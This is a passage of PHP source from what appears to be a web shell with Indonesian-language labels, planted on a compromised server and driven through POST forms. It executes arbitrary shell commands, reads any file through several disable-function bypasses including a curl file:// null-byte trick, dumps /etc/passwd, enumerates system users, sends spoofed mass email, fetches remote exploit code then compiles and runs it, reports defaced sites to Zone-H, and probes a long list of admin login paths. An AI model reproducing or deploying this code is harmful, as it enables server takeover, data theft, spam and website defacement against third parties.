	while($target = count($orang)){
		$header = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
		$header .= "MIME-Version: 1.0" . "\r\n";
		$header .= "From: MyHeartIsyr <$dari>" . "\r\n";
		$header .= "To: $target" . "\r\n";
		echo "[~] Sending to $target\n";
		
		if(@mail($target, $subjek, $pesan, $header) == false){
			echo "[!] Gagal\n";
		}
		else {
			echo "[$] Berhasil\n";
		}
	}
	echo "[i] Semua beres\n";		
	echo "</pre>";
}
elseif(isset($_POST['sedot'])){
	$web = trim($_POST['web']);
	$box = trim($_POST['box']);
	$dir = magicboom($box);
	$sedotgan = sedot($pilihan, $web);
	$pindah = $dir . $sedotgan;
	if(is_file($pindah)){
		echo "<script>alert('[!] File Downloaded Successfull');</script>";
	}
	else {
		echo "<script>alert('[!] Failure to Download File');</script>";
	}
}
elseif(isset($_POST['byebye'])){
	$kind = $_POST['kind_bypass'];
	switch($kind){
		case "xsystem":
			echo "<pre>".system($_POST['the_file'])."</pre>";
			break;
		case "xshell_exec":
			echo "<pre>".shell_exec($_POST['the_file'])."</pre>";
			break;
		case "xpassthru":
			echo "<pre>".passthru($_POST['the_file'])."</pre>";
			break;
		case "xexec":
			echo "<pre>".exec($_POST['the_file'])."</pre>";
			break;
		case "xawk":
			echo "<pre>".lets_call("awk -F: '{ print $1 }' ".$_POST['the_file']." | sort")."</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['baca'])){
	$readme = $_POST['readme'];
	switch($readme){
		case 'show_source': $show =  @show_source($_POST['my_file']);  break;
		case 'highlight_file': $highlight = @highlight_file($_POST['my_file']); break;
		case 'readfile': $readfile = @readfile($_POST['my_file']);  break;
		case 'include': $include = @include($_POST['my_file']); break;
		case 'require': $require = @require($_POST['my_file']);  break;
		case 'file': $file =  @file($_POST['my_file']);  foreach ($_POST['my_file'] as $key => $value) {  print $value; }  break;
		case 'fread': $fopen = @fopen($_POST['my_file'],"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;
		case 'file_get_contents': $file_get_contents =  @file_get_contents($_POST['my_file']); print_r($file_get_contents);  break;
		case 'fgets': $fgets = @fopen($_POST['my_file'],"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;
		case 'curl_init': $ch = curl_init("file:///".$_POST['my_file']."\x00/../../../../../../../../../../../../".__FILE__); curl_exec($ch); break;
		default: break; 
	}
}
elseif(isset($_POST['blekok'])){
	$bypass = $_POST['bypass'];
	switch($bypass){
		case "mshell_exec":
			echo "<pre class=\"iseng\">".shell_exec("cat /etc/passwd")."</pre>";
			break;
		case "mexec":
			echo "<pre class\"iseng\">".exec("cat /etc/passwd")."</pre>";
			break;
		case "mpassthru":
			echo "<pre class=\"iseng\">".passthru("cat /etc/passwd")."</pre>";
			break;
		case "msystem":
			echo "<pre class=\"iseng\">".system("cat /etc/passwd")."</pre>";
			break;
		case "mposix_getpwuid":
			echo "<pre class=\iseng\">";
			for($uid=0;$uid<60000;$uid++){ 
				$ara = posix_getpwuid($uid);
				if (!empty($ara)) {
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "\n";
				}
			}
			echo "</pre>";
			break;
		default: break;
	}
}
elseif(isset($_POST['go_hantu'])){
	$kepada = $_POST['atom_to'];
	$ini_subjek = $_POST['atom_subject'];
	$msg = nl2br($_POST['msg']);
	$dari = "myheart-isyr@cia.xxx";
	
	$header = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
	$header .= "MIME-Version: 1.0" . "\r\n";
	$header .= "From: MyHeartIsyr <$dari>" . "\r\n";
	$header .= "To: $kepada" . "\r\n";
	if(@mail($kepada, $ini_subjek, $msg, $header) == false){
		echo "<script>alert('[!] Gagal');</script>";
	}
	else {
		echo "<script>alert('[!] Berhasil');</script>";
	}
}
elseif(isset($_POST['sendtozoneh'])){
	ob_start();
	$sub = @get_loaded_extensions();
	if(!in_array("curl", $sub)){
		die("<script>alert('[-] Curl Is Not Supported !!');</script>");
	}

	$hacker = $_POST['hacker'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
				
	if (empty($hacker)){
		die ("<script>alert('[-] You Must Fill the Attacker name !');</script>");
	}
	elseif($method == "--------SELECT--------") {
		die("<script>alert('[-] You Must Select The Method !');</script>");
	}
	elseif($neden == "--------SELECT--------") {
		die("<script>alert('[-] You Must Select The Reason');</script>");
	}
	elseif(empty($site)) {
		die("<script>alert('[-] You Must Enter the Sites List !')</script>");
	}
	$i = 0;
	$sites = explode("\n", $site);
	while($i < count($sites)) {
		if(substr($sites[$i], 0, 4) != "http"){
			$sites[$i] = "http://".$sites[$i];
		}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "<script>alert('Site : ".$sites[$i]." Defaced !');</script>";
		++$i;
	}
	echo "<script>alert('[+] Sending Sites To Zone-H Has Been Completed Successfully !!');</script>";
}
elseif(isset($_POST['load'])){
	$prog_load = $_POST['prog_load'];
	switch($prog_load){
		case "c":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("gcc $cuy -o exploit; chmod +x exploit; ./exploit");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "cpp":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("g++ $cuy -o exploit; chmod +x exploit; ./exploit");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "py":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("chmod +x $cuy; python $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "pl":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("chmod +x $cuy; perl $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		case "rb":
			$cuy = sedot($_POST['downtype'], $_POST['xpl_code']);
			$exe = lets_call("chmod +x $cuy; ruby $cuy");
			if($exe){
				echo "<script>alert('Done');</script>";
			}
			else {
				echo "<script>alert('Fail');</script>";
			}
			break;
		default: break;
	}
}
elseif(isset($_POST['find'])){
	echo "<pre class=\"iseng\">";
	$site = $_POST['site'];
	
	$adminlocales = array(
	"-adminweb/",
	"!adminweb/",
	"@adminweb/",
	"adminweb121/",
	"adminweb90/",
	"adminweb145/",
	"khususadmin/",
	"rahasiaadm/",
	"adminweb123123/",
	"adminweb2222/",
	"adminlanel/",
	"adminlanel.php/",
	"monitor123.php/",
	"masuk.php/",
	"css.php/", 
	"admin1235.php/", 
	"master.php/",
	"1admin/",
	"123admin/",
	"addmin/",
	"home.php",
	"css/",
	"rediect.php/",
	"masuk.php/",
	"index.php/",
	"webpaneladmin123/",
	"registeradm/",
	"register/",
	"member123/",
	"123adminweb/",
	"123paneladminweb/",
	"panelauth1231/",
	"loginadminweb21/",
	"loginadminweb123/",
	"loginadminweb/",
	"webadmin123/",
	"redakturadmin/",
	"paneladminweb/",
	"admloginadm/",
	"4dm1n/",
	"admin12345/",
	"adminweb12/",
	"adminweb111/",
	"adminweb123/",
	"adminweb1/",
	"gangmasuk/",
	"gangadmin/",
	"admredaktur/",
	"adminwebredaktur/",
	"adminredaktur/",
	"adm/", 
	"_adm_/", 
	"_admin_/", 
	"_loginadm_/", 
	"_login_admin_/", 
	"minmin", 
	"loginadmin3/",  
	"masuk/admin", 
	"webmail", 
	"_loginadmin_/", 
	"_login_admin.php_/", 
	"_admin_/", 
	"_administrator_/", 
	"operator/", 
	"sika/", 
	"adminweb/", 
	"develop/", 
	"ketua/", 
	"redaktur/", 
	"author/", 
	"admin/", 
	"administrator/", 
	"adminweb/", 
	"user/", 
	"users/", 
	"dinkesadmin/", 
	"retel/", 
	"author/", 
	"panel/", 
	"paneladmin/", 
	"panellogin/",
	"redaksi/", 
	"cp-admin/", 
	"login@web/", 
	"admin1/", 
	"admin2/", 
	"admin3/", 
	"admin4/", 
	"admin5/", 
	"admin6/", 
	"admin7", 
	"admin8", 
	"admin9",
	"admin10", 
	"master/", 
	"master/index.php", 
	"master/login.php", 
	"operator/index.php", 
	"sika/index.php", 
	"develop/index.php", 
	"ketua/index.php",
	"redaktur/index.php", 
	"admin/index.php", 
	"administrator/index.php", 
	"adminweb/index.php", 
	"user/index.php", 
	"users/index.php", 
	"dinkesadmin/index.php", 
	"retel/index.php", 
	"author/index.php", 
	"panel/index.php", 
	"paneladmin/index.php",
	"panellogin/index.php", 
	"redaksi/index.php", 
	"cp-admin/index.php", 
	"operator/login.php", 
	"sika/login.php", 
	"develop/login.php",
	"ketua/login.php",
	"redaktur/login.php",
	"admin/login.php",
	"administrator/login.php", 
	"adminweb/login.php", 
	"user/login.php", 
	"users/login.php", 
	"dinkesadmin/login.php", 
	"retel/login.php", 
	"author/login.php", 
	"panel/login.php", 
	"paneladmin/login.php", 
	"panellogin/login.php", 
	"redaksi/login.php", 
	"cp-admin/login.php", 
	"terasadmin/", 
	"terasadmin/index.php", 
	"terasadmin/login.php", 
	"rahasia/", 
	"rahasia/index.php", 
	"rahasia/admin.php", 
	"rahasia/login.php", 
	"dinkesadmin/", 
	"dinkesadmin/login.php", 
	"adminpmb/", 
	"adminpmb/index.php", 
	"adminpmb/login.php", 
	"system/", 
	"system/index.php", 
	"system/login.php", 
	"webadmin/", 
	"webadmin/index.php", 
	"webadmin/login.php", 
	"wpanel/", 
	"wpanel/index.php", 
	"wpanel/login.php", 
	"adminpanel/index.php", 
	"adminpanel/", 
	"adminpanel/login.php", 
	"adminkec/", 
	"adminkec/index.php", 
	"adminkec/login.php", 
	"admindesa/", 
	"admindesa/index.php", 
	"admindesa/login.php", 
	"adminkota/", 
	"adminkota/index.php", 
	"adminkota/login.php", 
	"admin123/", 
	"admin123/index.php", 
	"dologin/", 
	"home.asp/",
	"supervise/amdin", 
	"relogin/adm", 
	"checkuser", 
	"relogin.php", 
	"relogin.asp", 
	"wp-admin", 
	"registration", 
	"suvervise", 
	"superman.php", 
	"member.php",
	"home/admin",
	"po-admin/",
	"do_login.php", 
	"bo-login", 
	"bo_login.php/", 
	"index.php/admin", 
	"admiiin.php", 
	"masuk/adm",
	"website_login/", 
	"dashboard/admin", 
	"dashboard.php", 
	"dashboard_adm", 
	"admin123/login.php", 
	"logout1/", 
	"logout/",
	"pengelola/login", 
	"manageradm/", 
	"logout.asp", 
	"manager/adm", 
	"pengelola/web",
	"auth/panel", 
	"logout/index.php", 
	"logout/login.php", 
	"controladm/", 
	"logout/admin.php", 
	"adminweb_setting", 
	"adm/index.asp", 
	"adm.asp", 
	"affiliate.asp", 
	"adm_auth.asp", 
	"memberadmin.asp", 
	"siteadmin/login.asp", 
	"siteadmin/login", 
	"paneldecontrol", 
	"cms/admin", 
	"administracion.php", 
	"/ADMON/", 
	"administrador/", 
	"panelc/", 
	"admincp", 
	"admcp", 
	"cp", 
	"modcp", 
	"moderatorcp", 
	"adminare", 
	"cpanel", 
	"controlpanel"
	);
	foreach($adminlocales as $search){
		$headers = get_headers("$site$search");
		if(preg_match("/200/", $headers[0])){
			echo "[!] <a href=\"".$url.$search."\">$url$search</a> Founded!";
		}
		else {
			echo "[!] Not found!";
		}
	}
	echo "</pre>";
}

echo "<pre class=\"iseng\">Disable Function:&nbsp;".$dis."</pre>";
?>
<font style="font-family: Consolas"><center><?=$my_config['footer']?></center></font><br>
</body>
</html>